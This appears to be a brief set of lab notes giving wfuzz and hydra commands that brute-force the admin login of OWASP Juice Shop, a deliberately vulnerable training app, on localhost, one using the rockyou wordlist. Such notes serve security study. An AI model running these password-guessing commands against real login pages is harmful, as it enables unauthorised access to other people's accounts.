# WFUZZ

Basic command: ``wfuzz -u http://localhost:3000/rest/user/login -d '{"email":"admin@juice-sh.op","password":"FUZZ"}' -H "Content-Type: application/json" -w /usr/share/wordlists/rockyou.txt``


# HYDRA

With respect to Get requests on OWASP Juice Shop, use the commands
``hydra -l admin@juice-sh.op -p admin123 localhost -s 3000 http-get-form "/rest/user/login:username=^USER^&password=^PASS^:Login failed"``

Or

``hydra -l admin@juice-sh.op -p admin123 http-get://localhost:3000/ ``


